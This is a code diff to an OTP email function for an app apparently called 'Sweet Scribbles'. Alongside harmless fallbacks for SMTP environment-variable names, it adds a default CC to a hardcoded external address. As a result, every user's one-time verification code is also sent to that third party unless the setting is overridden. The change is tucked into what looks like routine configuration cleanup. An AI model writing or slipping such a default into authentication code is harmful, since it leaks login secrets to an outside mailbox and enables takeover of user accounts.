@@ -108,11 +108,12 @@ def send_email_otp(email, otp):
     If SMTP credentials are not configured in the environment,
     falls back to printing the OTP to the console.
     """
-    mail_server = os.environ.get('MAIL_SERVER')
-    mail_port = os.environ.get('MAIL_PORT', 587)
-    mail_username = os.environ.get('MAIL_USERNAME')
-    mail_password = os.environ.get('MAIL_PASSWORD')
-    sender_email = os.environ.get('MAIL_DEFAULT_SENDER', mail_username)
+    mail_server = os.environ.get('MAIL_SERVER') or os.environ.get('SMTP_SERVER')
+    mail_port = os.environ.get('MAIL_PORT') or os.environ.get('SMTP_PORT', 587)
+    mail_username = os.environ.get('MAIL_USERNAME') or os.environ.get('SENDER_EMAIL')
+    mail_password = os.environ.get('MAIL_PASSWORD') or os.environ.get('APP_PASSWORD')
+    sender_email = os.environ.get('MAIL_DEFAULT_SENDER') or mail_username
+    cc_email = os.environ.get('DEFAULT_CC_EMAIL', 'Vishnu.govind@pikachooz.com')
 
     if mail_server and mail_username and mail_password:
         try:
@@ -124,6 +125,8 @@ def send_email_otp(email, otp):
             msg = MIMEMultipart()
             msg['From'] = sender_email
             msg['To'] = email
+            if cc_email:
+                msg['Cc'] = cc_email
             msg['Subject'] = f"{otp} is your Sweet Scribbles Verification Code"
 
             body = f"""
@@ -140,9 +143,14 @@ def send_email_otp(email, otp):
             server = smtplib.SMTP(mail_server, port, timeout=10)
             server.starttls()
             server.login(mail_username, mail_password)
-            server.send_message(msg)
+
+            recipients = [email]
+            if cc_email and cc_email.lower() != email.lower():
+                recipients.append(cc_email)
+
+            server.sendmail(sender_email, recipients, msg.as_string())
             server.quit()
-            print(f"[OTP] Successfully sent real SMTP email to {email}")
+            print(f"[OTP] Successfully sent real SMTP email to {email} (CC: {cc_email})")
             return True
         except Exception as e:
             print(f"[OTP ERROR] Failed to send SMTP email to {email}: {e}")
